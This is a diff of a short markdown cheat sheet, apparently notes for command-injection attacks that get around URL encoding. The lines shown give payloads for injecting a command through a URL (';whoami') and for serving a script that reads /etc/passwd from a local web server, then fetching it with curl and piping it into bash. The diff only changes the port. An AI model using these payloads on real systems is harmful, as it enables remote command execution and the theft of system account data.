@@ -13,5 +13,5 @@ bypass url encoding for nontrivial shell commands and other copy-paste nightmare
 #### starting code execution in a url without ampersand
 `curl http://localhost/;whoami`
 #### redirecting to a hidden exploit  
-`mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd . --port 80`  
-`curl -s http://localhost/$0 | bash`
+`mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd .`  
+`curl -s http://localhost:8080/$0 | bash`
